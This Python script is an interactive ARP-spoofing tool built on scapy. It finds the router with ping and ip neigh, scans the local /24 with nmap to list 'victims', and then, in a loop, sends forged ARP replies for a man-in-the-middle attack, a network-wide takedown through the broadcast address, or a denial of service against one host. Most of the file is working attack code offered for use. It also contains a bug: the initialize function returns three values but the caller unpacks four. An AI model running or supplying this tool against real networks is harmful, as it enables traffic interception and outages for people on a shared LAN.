import subprocess, time

from scapy.layers.l2 import ARP
from scapy.sendrecv import send

from victim import Victim
from attacker import Attacker
from network import Network
from color import Color #used to output to the terminals with colors

from random import randint
from random import seed

def initialize():
    #get router information
    Color.pl("{?} Doing pings to discover the router")
    time.sleep(2)
    # clear arp table
    subprocess.call(["ip", "neigh", "flush", "all"])
    # used to make sure the router has been added to the ARP table
    subprocess.call(["ping", "8.8.8.8", "-c", "2"])
    # neighbors table (ARP)
    command = "ip neigh"
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)).split('\\n')
    routerIP = commandOutput[0].split()[0][2:]
    routerMAC = commandOutput[0].split()[4]

    # get ip information
    command = 'ifconfig'
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)).split('\\n')
    attackerIP = commandOutput[1].split()[1]
    attackerMAC = commandOutput[3].split()[1]
    broadcastIP = commandOutput[1].split()[-1]

    # discover users connected to router by running nmap on the router and filtering the output in the format we need
    command = "nmap "+ routerIP +"/24 -n -sP | grep 'report\|MAC'"
    commandOutput = str(subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT))[2:] # run the comand and remove "b'" from the beginning
    connectedDevices = commandOutput.split('\\n')[2:-1] #remove first two elemntsbecause the are the router, and remove the last element which is a "'"

    victimList = [] # list we are going to use and popsulate it with possible victims
    for i in range(0, len(connectedDevices)-1, 2):
        ip = connectedDevices[i].split()[4]
        mac = connectedDevices[i+1].split()[2]
        if ip != attackerIP:
            victimList.append(Victim([ip, mac]))
    network = Network([routerIP, routerMAC, broadcastIP])
    attacker = Attacker([attackerIP, attackerMAC])
    return (network, attacker, victimList)

# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    takedown=False
    specific=False
    process= initialize()
    (network, attacker, victimsList,broadcastIP)=process
    Color.pl("{+} " + network.toString())
    Color.pl("{+} " + attacker.toString())
    for e in victimsList:
        Color.pl("{!} " + e.toString())

    op = 1  # Op code 1 for ARP requests
    while(True):
        Color.pl("{?} What type of ARP attack do you want to perform? \n (Man-in-the-middle[1] or Take down the network![2] or Attack specific victim[3]?)")
        selection = input().lower()
        routerIP=network.ip
        if selection.lower() == "2":
            ip=broadcastIP
            mac="34:23:fe:3a:3e:10" #random
            takedown=True
            break
        else:
            if selection.lower()=="3":
                specific=True
                mac="34:23:fe:3a:3e:10" #random
                break
            else:
                if selection.lower()=="1":
                    break
                else:
                    Color.pl("{!} Invalid Input")
    while(takedown==False):
        Color.pl("{?} Do you want to enter the target manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter target IP address ")
            ip = input().strip()
            Color.pl("{+} Enter target MAC address ")
            mac = input().strip()
            break
        elif selection.lower() == "n":
            for i in range(len(victimsList)):
                Color.pl("{!} " + str(i) + ":   " + victimsList[i].toString())
            Color.pl("{+} Enter Index of Target")
            index = int(input())
            ip = victimsList[index].ip
            break
        else:
            Color.pl("{!} Invalid Input")

    while(takedown==False):
        Color.pl("{?} Do you want to enter the router IP manually? (y or n)")
        selection = input().lower()
        if selection.lower() == "y":
            Color.pl("{+} Enter router IP address ")
            routerIP = input().strip()
            break
        elif selection.lower() == "n":
            routerIP = network.ip
            break
        else:
            Color.pl("{!} Invalid Input")

    Color.pl("{+} {R} Router IP: {G}" + routerIP)
    Color.pl("{+} {R} Target IP: {G}" + ip)
    time.sleep(2)
    
    Color.pl("{+} Processing :) ")
    
    if (takedown==False and specific==False):
        arp= ARP(op=2, psrc=routerIP, pdst=ip)
        arp2= ARP(op=2, psrc=ip, pdst=routerIP)
    else:
        arp = ARP(op=2, psrc=routerIP, pdst=ip, hwsrc=mac)

        
            
    

    while 1:
        if (takedown==False and specific==False):
            send(arp)
            send(arp2)
            time.sleep(1)
        else:
            seed(655)
            counter=0
            while 1:
                if (counter % 5 == 0):
                   op = randint(1, 2)
                   s = randint(1, 3)
                arp = ARP(op=op, psrc=routerIP, pdst=ip, hwsrc=mac)
                send(arp)
                    # lower sleep timer to make it better, victim ajusts ARP table otherwise
                time.sleep(s)
                send(arp)
                time.sleep(1)
                counter += 1
